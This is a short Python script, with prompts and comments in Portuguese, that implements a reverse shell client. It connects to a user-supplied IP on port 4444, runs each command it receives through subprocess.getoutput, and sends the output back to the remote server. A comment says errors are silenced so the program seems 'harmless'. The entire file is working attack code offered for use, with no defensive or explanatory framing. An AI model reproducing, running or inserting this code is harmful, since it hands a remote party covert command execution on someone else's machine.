import socket
import subprocess

def main():
    ip = input("Digite o IP do servidor: ")
    porta = 4444

    try:
        s = socket.socket()
        s.connect((ip, porta))

        while True:
            comando = s.recv(1024).decode()

            if comando.lower() == 'exit':
                break

            try:
                resultado = subprocess.getoutput(comando)
                s.send(resultado.encode() if resultado else b"[+] Comando executado.")
            except Exception as e:
                s.send(f"[!] Erro: {str(e)}".encode())

        s.close()
    except Exception as e:
        pass  # Silencia erros para parecer "inofensivo"

if __name__ == "__main__":
    main()
